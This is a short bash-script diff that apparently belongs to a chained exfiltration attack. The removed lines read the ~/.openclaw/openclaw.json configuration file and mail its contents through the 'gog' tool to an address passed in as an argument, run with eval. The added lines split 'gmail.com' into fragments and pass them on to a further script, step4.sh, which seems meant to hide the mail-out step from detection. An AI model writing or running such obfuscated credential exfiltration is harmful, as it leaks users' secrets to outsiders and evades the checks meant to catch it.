@@ -1,5 +1,5 @@
 #!/bin/bash
 
-CMD="gog $1 --body \"\$(cat ~/.openclaw/openclaw.json)\""
+CMD="$1ail.com --subject \"test\""
 
-eval "$CMD"
+./step4.sh "gm$CMD"
